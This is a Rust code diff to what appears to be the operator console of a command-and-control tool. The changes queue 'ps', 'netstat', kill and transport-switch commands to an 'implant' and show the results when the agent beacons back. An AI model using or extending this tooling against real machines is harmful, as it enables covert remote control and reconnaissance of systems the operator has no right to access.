@@ -1033,29 +1033,64 @@ impl App {
                                     }
                                 }
                                 "ps" => {
-                                    if let Some(sess) = self.selected_session() {
-                                        // Show process list popup (mock data for now)
-                                        let ps_header = format!("Running Processes on {}\n\n{:<40} {:<10} {:<10}",
-                                            sess.hostname, "Process Name", "PID", "Context");
-                                        self.popup_content = format!(
-                                            "{}\n\n  explorer.exe                              4512       System    \n  svchost.exe                              1024       System    \n  csrss.exe                                8192       System    \n  winlogon.exe                             3456       System    \n  conhost.exe                              2048       User      \n  notepad.exe                              5632       User      \n\nNote: To see actual process list, 'ps' command must be\nimplemented on the agent side.",
-                                            ps_header
-                                        );
+                                    if let Some(sess) = self.selected_session().cloned() {
+                                        // Queue ps command to implant
+                                        let q = self.cmd_queue.lock().unwrap();
+                                        let entry = q.get(&sess.id).cloned().unwrap_or_default();
+                                        drop(q);
+
+                                        let mut q = self.cmd_queue.lock().unwrap();
+                                        let mut new_cmds = entry;
+                                        new_cmds.push("ps".to_string());
+                                        q.insert(sess.id.clone(), new_cmds);
+
+                                        // Show waiting popup (clear old content)
+                                        self.popup_content = format!("Process List - {}\n\n[Querying processes...]\n\nCommand sent to agent. Results will appear when the agent beacons back.", sess.hostname);
                                         self.popup_mode = PopupMode::PSDisplay;
                                         self.popup_scroll = 0;
-                                        self.last_action = "Process list popup opened (press ESC to close)".to_string();
+                                        self.last_action = "ps command queued ✓".to_string();
                                     } else {
                                         self.last_action = "No active session".to_string();
                                     }
                                 }
                                 "netstat" => {
-                                    self.last_action = "Netstat: Not yet implemented on agent".to_string();
+                                    if let Some(sess) = self.selected_session().cloned() {
+                                        // Queue netstat command to implant
+                                        let q = self.cmd_queue.lock().unwrap();
+                                        let entry = q.get(&sess.id).cloned().unwrap_or_default();
+                                        drop(q);
+
+                                        let mut q = self.cmd_queue.lock().unwrap();
+                                        let mut new_cmds = entry;
+                                        new_cmds.push("netstat".to_string());
+                                        q.insert(sess.id.clone(), new_cmds);
+
+                                        // Show waiting popup
+                                        let netstat_header = format!("Network Connections - {}", sess.hostname);
+                                        self.popup_content = format!("{}\n\n[Querying network connections...]\n\nCommand sent to agent. Results will appear when the agent beacons back.", netstat_header);
+                                        self.popup_mode = PopupMode::PSDisplay;
+                                        self.popup_scroll = 0;
+                                        self.last_action = "netstat command queued ✓".to_string();
+                                    } else {
+                                        self.last_action = "No active session".to_string();
+                                    }
                                 }
                                 "kill-session" => {
                                     if let Some(sess) = self.selected_session().cloned() {
+                                        // Queue kill command to implant first
+                                        let q = self.cmd_queue.lock().unwrap();
+                                        let entry = q.get(&sess.id).cloned().unwrap_or_default();
+                                        drop(q);
+
+                                        let mut q = self.cmd_queue.lock().unwrap();
+                                        let mut new_cmds = entry;
+                                        new_cmds.push("remediate.kill".to_string());  // Send kill command
+                                        q.insert(sess.id.clone(), new_cmds);
+
+                                        // Remove session locally after sending kill
                                         let sess_id = sess.id.clone();
                                         self.sessions.retain(|s| s.id != sess_id);
-                                        self.last_action = format!("Session {} terminated ✓", sess_id);
+                                        self.last_action = format!("Session {} terminated ✓ (kill command sent)", sess_id);
                                     } else {
                                         self.last_action = "No active session".to_string();
                                     }
@@ -1078,12 +1113,15 @@ impl App {
                     if let Some(idx) = self.transport_state.selected() {
                         if idx < self.transports.len() {
                             let selected_name = self.transports[idx].name.clone();
+                            // Queue transport switch command to implant
+                            if let Some(sess) = self.selected_session() {
+                                listener::queue_command(&self.cmd_queue, &sess.id, selected_name.clone());
+                            }
                             // Mark selected transport as active, deactivate others
                             for (i, tm) in self.transports.iter_mut().enumerate() {
                                 tm.is_active = i == idx;
                             }
-                            self.last_action = format!("Active transport: {} ✓", selected_name);
-                            // TODO: call dispatcher C API to actually switch the module on the implant
+                            self.last_action = format!("Transport switch → {} ✓", selected_name);
                         }
                     }
                 }
@@ -2318,6 +2356,28 @@ fn main() -> Result<(), io::Error> {
                         if !output_str.is_empty() {
                             app.popup_content.push_str(&format!("{}\n\n", output_str));
                             app.popup_scroll = (app.popup_content.lines().count() as u16).saturating_sub(10);
+                        }
+                    }
+                }
+            }
+
+            // Check for ps/netstat output and display in PS popup
+            if app.popup_mode == PopupMode::PSDisplay {
+                // Try ps output first
+                if let Some(output_data) = listener::retrieve_download(&app.dl_store, &sess.id, "ps_output.txt") {
+                    if let Ok(output_str) = String::from_utf8(output_data) {
+                        if !output_str.is_empty() {
+                            app.popup_content = format!("Process List - {}\n\n{}", sess.hostname, output_str);
+                            app.popup_scroll = 0;
+                        }
+                    }
+                }
+                // Try netstat output (replaces ps if it exists)
+                else if let Some(output_data) = listener::retrieve_download(&app.dl_store, &sess.id, "netstat_output.txt") {
+                    if let Ok(output_str) = String::from_utf8(output_data) {
+                        if !output_str.is_empty() {
+                            app.popup_content = format!("Network Connections - {}\n\n{}", sess.hostname, output_str);
+                            app.popup_scroll = 0;
                         }
                     }
                 }
